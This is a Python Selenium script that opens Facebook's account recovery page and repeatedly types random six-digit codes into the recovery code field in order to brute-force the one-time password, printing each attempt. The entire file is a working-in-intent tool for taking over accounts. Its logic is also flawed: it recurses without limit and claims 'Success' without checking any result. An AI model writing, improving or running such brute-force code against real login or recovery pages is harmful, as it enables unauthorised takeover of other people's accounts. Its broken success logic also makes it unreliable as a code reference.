import time
import random
import webbrowser
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By



code_used = []

def test(used_code):
    # time.sleep(0.5)
    r = random.randint(111111, 999999)
    input_code = driver.find_element(By.ID, "recovery_code_entry")
    if str(r) not in used_code:
        input_code.send_keys(str(r))
        input_code.send_keys(Keys.RETURN)
        used_code.append(str(r))
        print("[+] Attempt on "+str(r))
        enter = driver.find_element(By.TAG_NAME, "button")
        enter.click()
        test(used_code)
    else:
        print(str(r) + "is used")
        test(used_code)
    print("[+] Attempt on " + str(r) + " Success!!!")
    print("The OTP code is " + str(r))

def main(used_code):
    r = random.randint(111111,999999)
    input_code = driver.find_element(By.ID, "recovery_code_entry")
    input_code.send_keys(str(r))
    input_code.send_keys(Keys.RETURN)
    print("[+] Attempt on "+str(r))
    enter = driver.find_element(By.TAG_NAME, "button")
    enter.click()
    test(used_code)


driver = webdriver.Chrome()
driver.get("https://facebook.com")

time.sleep(10)
print("\n")
print("before proceeding fill up the page to get in OTP page.")
print("type \"Yes\" or \"yes\" or \"YES\" if done and want to proceed")
print("else type \"End\" or \"end\" or \"END\" not")
# answer = input(">> ")

def decision():
	answer = input(">> ")
	print("before proceeding fill up the page to get in OTP page.")
	print("type \"Yes\" or \"yes\" or \"YES\" if done and want to proceed")
	print("else type \"End\" or \"end\" or \"END\" not")
	if answer == "Yes" or answer =="yes" or answer == "YES":
		main(code_used)
	elif answer == "No" or answer == "no" or answer =="NO":
		print("end")
	else:
		decision()
decision()
